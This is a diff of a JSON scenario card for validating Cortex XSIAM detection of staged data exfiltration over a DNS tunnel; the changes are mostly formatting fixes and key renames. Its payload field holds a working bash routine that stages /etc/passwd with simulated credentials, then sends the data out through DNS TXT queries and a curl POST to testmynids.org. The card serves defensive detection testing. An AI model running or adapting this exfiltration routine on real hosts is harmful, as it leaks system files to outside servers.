@@ -46,9 +46,9 @@
     }
   },
   "identity": {
-    "name": "Staged Data Exfiltration via DNS Tunnel \u2014 XDR Staging + NGFW Stitch (T1048.003)",
-    "summary": "A service account harvests sensitive local files, archives them into a /tmp tarball, then exfiltrates the base64 chunks over a high-entropy DNS TXT tunnel (with an HTTPS-POST fallback). The Cortex value is end-to-end stitching: XSIAM joins the XDR staging leg (passwd read -> tar -> dig loop in xdr_data) to the NGFW DNS-anomaly leg (TXT burst in pan_dns) on the same hostname, turning two plausib\u2026",
-    "description": "This scenario validates XSIAM correlation on the staged-exfiltration kill chain where the collection/staging stages are visible only to the endpoint and the covert-channel egress is visible only to the network. Cortex XDR (xdr_data) observes the /etc/passwd read concatenated into a /tmp staging file, the tar+gzip of that staging directory, and the dig TXT loop. The NGFW DNS plane (pan_dns / network_story) observes the sustained TXT query burst with high-entropy 60-char labels and the >10x query-rate spike from a single source. Independently each looks like routine admin activity or noisy DNS; stitched on the shared hostname inside the correlation window they form a textbook T1074.001 -> T1572 -> T1048.003 exfiltration story. The card also covers the redundant HTTPS-POST exfil leg (curl -F upload + NGFW POST to the IOC domain) so the POV shows two independent egress channels converging on the same staged-data hash. All targets are 3CORESec testmynids.org test indicators \u2014 safe by design.",
+    "name": "Staged Data Exfiltration via DNS Tunnel — XDR Staging + NGFW Stitch (T1048.003)",
+    "summary": "A service account harvests sensitive local files, archives them into a /tmp tarball, then exfiltrates the base64 chunks over a high-entropy DNS TXT tunnel (with an HTTPS-POST fallback). The Cortex value is end-to-end stitching: XSIAM joins the XDR staging leg (passwd read -> tar -> dig loop in xdr_data) to the NGFW DNS-anomaly leg (TXT burst in pan_dns) on the same hostname, turning two plausib…",
+    "description": "This scenario validates XSIAM correlation on the staged-exfiltration kill chain where the collection/staging stages are visible only to the endpoint and the covert-channel egress is visible only to the network. Cortex XDR (xdr_data) observes the /etc/passwd read concatenated into a /tmp staging file, the tar+gzip of that staging directory, and the dig TXT loop. The NGFW DNS plane (pan_dns / network_story) observes the sustained TXT query burst with high-entropy 60-char labels and the >10x query-rate spike from a single source. Independently each looks like routine admin activity or noisy DNS; stitched on the shared hostname inside the correlation window they form a textbook T1074.001 -> T1572 -> T1048.003 exfiltration story. The card also covers the redundant HTTPS-POST exfil leg (curl -F upload + NGFW POST to the IOC domain) so the POV shows two independent egress channels converging on the same staged-data hash. All targets are 3CORESec testmynids.org test indicators — safe by design.",
     "severity": "high",
     "confidence": "high"
   },
@@ -124,7 +124,7 @@
   "execution": {
     "target_platform": "linux",
     "execution_framework": "atomic-red-team",
-    "framework_reference_id": "T1048.003 / T1074.001 \u2014 Atomic Tests (local staging + DNS exfiltration over TXT)",
+    "framework_reference_id": "T1048.003 / T1074.001 — Atomic Tests (local staging + DNS exfiltration over TXT)",
     "privilege_required": "user",
     "prerequisites": [
       {
@@ -138,7 +138,7 @@
     ],
     "payload": {
       "interpreter": "bash",
-      "code": "# All targets are 3CORESec testmynids.org test indicators \u2014 safe by design.\nmkdir -p /tmp/cortexsim_stage\necho '# Simulated credential file - NOT real credentials' > /tmp/cortexsim_stage/creds.txt\nfor i in 1 2 3 4 5; do echo \"user$i:simulated-hash-$(openssl rand -hex 16)\" >> /tmp/cortexsim_stage/creds.txt; done\ncat /etc/passwd | head -20 >> /tmp/cortexsim_stage/creds.txt\ntar -czf /tmp/cortexsim_stage/bundle.tar.gz /tmp/cortexsim_stage/creds.txt 2>/dev/null\nB64=$(base64 -w 0 /tmp/cortexsim_stage/bundle.tar.gz | head -c 2000)\nfor i in $(seq 0 $((${#B64}/60))); do chunk=$(echo -n \"$B64\" | cut -c$((i*60+1))-$(((i+1)*60))); [ -z \"$chunk\" ] && break; dig +short TXT \"$(echo -n \"$chunk\" | tr -d = | tr '/+' '-_').exfil.testmynids.org\" @1.1.1.1 > /dev/null || true; sleep 0.5; done\ncurl -sSL -m 15 -X POST -F \"data=@/tmp/cortexsim_stage/bundle.tar.gz\" \"http://testmynids.org/uid/index.html\" 2>/dev/null | head -5 || true",
+      "code": "# All targets are 3CORESec testmynids.org test indicators — safe by design.\nmkdir -p /tmp/cortexsim_stage\necho '# Simulated credential file - NOT real credentials' > /tmp/cortexsim_stage/creds.txt\nfor i in 1 2 3 4 5; do echo \"user$i:simulated-hash-$(openssl rand -hex 16)\" >> /tmp/cortexsim_stage/creds.txt; done\ncat /etc/passwd | head -20 >> /tmp/cortexsim_stage/creds.txt\ntar -czf /tmp/cortexsim_stage/bundle.tar.gz /tmp/cortexsim_stage/creds.txt 2>/dev/null\nB64=$(base64 -w 0 /tmp/cortexsim_stage/bundle.tar.gz | head -c 2000)\nfor i in $(seq 0 $((${#B64}/60))); do chunk=$(echo -n \"$B64\" | cut -c$((i*60+1))-$(((i+1)*60))); [ -z \"$chunk\" ] && break; dig +short TXT \"$(echo -n \"$chunk\" | tr -d = | tr '/+' '-_').exfil.testmynids.org\" @1.1.1.1 > /dev/null || true; sleep 0.5; done\ncurl -sSL -m 15 -X POST -F \"data=@/tmp/cortexsim_stage/bundle.tar.gz\" \"http://testmynids.org/uid/index.html\" 2>/dev/null | head -5 || true",
       "input_variables": [],
       "timeout_seconds": 120
     },
@@ -259,7 +259,7 @@
     ],
     "correlation_rules": [
       {
-        "name": "Staged DNS Exfil Cross-Plane Stitch \u2014 XDR Staging + NGFW DNS Anomaly",
+        "name": "Staged DNS Exfil Cross-Plane Stitch — XDR Staging + NGFW DNS Anomaly",
         "rule_id": "CR-MP-0004",
         "logic": "(BIOC(MP-003 Tar Gzip Compression Of Tmp Staging By Service Account) AND BIOC(MP-003 Dig TXT Tight Loop From Service Account) AND XQL(MP-003 NGFW DNS TXT Tunneling Burst High Entropy Labels)) -> join on hostname within 60s"
       },
@@ -269,15 +269,15 @@
         "logic": "(BIOC(MP-003 Passwd Read Then Write To Tmp Staging Dir) AND XQL(MP-003 NGFW DNS Query Rate Spike From Single Source)) -> join on hostname within 120s"
       },
       {
-        "name": "Redundant HTTPS Exfil IOC Stitch \u2014 Curl Upload + NGFW POST + IOC",
+        "name": "Redundant HTTPS Exfil IOC Stitch — Curl Upload + NGFW POST + IOC",
         "rule_id": "CR-MP-0006",
         "logic": "(BIOC(MP-003 Curl Form Upload Of Staged Data By Service Account) AND XQL(MP-003 NGFW HTTP Post File Upload To IOC Domain) AND IOC(domain: testmynids.org)) -> join on src_host within 60s"
       }
     ],
     "analytics_modules": [
-      "Cortex XSIAM Analytics \u2014 DNS tunneling / high-entropy TXT label detection",
-      "Cortex XSIAM Analytics \u2014 DNS query-rate spike per source",
-      "Cortex XSIAM Correlation Engine \u2014 staging-to-egress causality stitch by hostname"
+      "Cortex XSIAM Analytics — DNS tunneling / high-entropy TXT label detection",
+      "Cortex XSIAM Analytics — DNS query-rate spike per source",
+      "Cortex XSIAM Correlation Engine — staging-to-egress causality stitch by hostname"
     ]
   },
   "panw_mapping": {
@@ -328,14 +328,14 @@
         "evidence_query": "Playbook isolates the host, sinkholes the tunnel parent domain, and quarantines the /tmp staging artifacts."
       }
     ],
-    "use_cases": [
+    "threat_scenarios": [
       {
-        "use_case_id": "UC-MP-003",
-        "name": "Cross-Plane Incident Stitching \u2014 Endpoint Staging Through Network Covert Channel",
+        "threat_scenario_id": "TS-MP-003",
+        "name": "Cross-Plane Incident Stitching — Endpoint Staging Through Network Covert Channel",
         "description": "Validate that XSIAM stitches the XDR staging stages and the NGFW DNS-tunnel egress into a single exfiltration incident with stage-to-tunnel MTTD.",
-        "test_cases": [
+        "threat_steps": [
           {
-            "test_case_id": "TC-MP-003A",
+            "threat_step_id": "TS-MP-003A",
             "objective": "Each plane fires (XDR tar/dig BIOCs + NGFW DNS anomaly XQL).",
             "preconditions": [
               "Cortex XDR Linux agent >= 8.4.0 healthy on the source host.",
@@ -352,7 +352,7 @@
             "expected_score_weight": 0.5
           },
           {
-            "test_case_id": "TC-MP-003B",
+            "threat_step_id": "TS-MP-003B",
             "objective": "Staging and tunnel legs stitch into one incident with measurable MTTD.",
             "success_criteria": [
               "Correlation `CR-MP-0004` groups the staging and tunnel legs on hostname into one incident_id.",
@@ -387,7 +387,7 @@
       "primary": true
     },
     {
-      "title": "MITRE ATT&CK T1048.003 \u2014 Exfiltration Over Unencrypted Non-C2 Protocol",
+      "title": "MITRE ATT&CK T1048.003 — Exfiltration Over Unencrypted Non-C2 Protocol",
       "url": "https://attack.mitre.org/techniques/T1048/003/",
       "publisher": "MITRE",
       "publisher_id": "SRC-MITRE-ATTACK"
